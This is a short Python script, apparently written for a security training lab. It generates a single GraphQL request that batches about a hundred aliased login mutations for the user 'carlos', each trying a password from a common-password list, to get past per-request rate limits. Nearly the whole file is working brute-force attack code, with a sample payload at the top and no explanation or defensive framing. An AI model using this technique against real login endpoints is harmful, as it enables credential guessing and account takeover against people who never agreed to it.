

#"{"query":"mutation{ a0: login(input: {username: \"carlos\", password: \"1234\"}) {success token} a1: login(input: {username: \"carlos\", password: \"12345\"}) {success token} }"}"



password_list = ["123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111", "1234567", "dragon", "123123", "baseball", "abc123", "football", "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop", "123321", "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx", "7777777", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1", "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer", "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000", "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars", "klaster", "112233", "george", "computer", "michelle", "jessica", "pepper", "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777", "pass", "maggie", "159753", "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea", "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin", "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor", "monitoring", "montana", "moon", "moscow"]














def create_an_alias(aliasnumber, password_to_try):
    example = 'aREPLACABLE_ALIAS: login(input: {username: \\"carlos\\", password: \\"REPLACABLE_PASSWORD\\"}) {success token}'
    str = ""
    str = example.replace("REPLACABLE_PASSWORD", password_to_try)
    return str.replace("REPLACABLE_ALIAS", aliasnumber)


def iterate_aliases_and_passwd(password_list):
    alias_strings_list1 = []
    for i in range(len(password_list)):
        password = password_list[i]

        alias = create_an_alias(str(i), password)
        alias_strings_list1.append(alias)

    return alias_strings_list1




def combine_aliases(alias_strings_list):

    combined_string =  " ".join(alias_strings_list,)


    return combined_string

def make_the_final_queryshape(ready_aliasshape):
    shell_json = "{\"query\":\"mutation{ EVERYTHING_GOES_HERE }\"}"
    final_one = shell_json.replace("EVERYTHING_GOES_HERE", ready_aliasshape)
    final_two = final_one.replace(" ", "")
    return final_two.replace("successtoken", "success token")


















print(make_the_final_queryshape(combine_aliases(iterate_aliases_and_passwd(password_list))))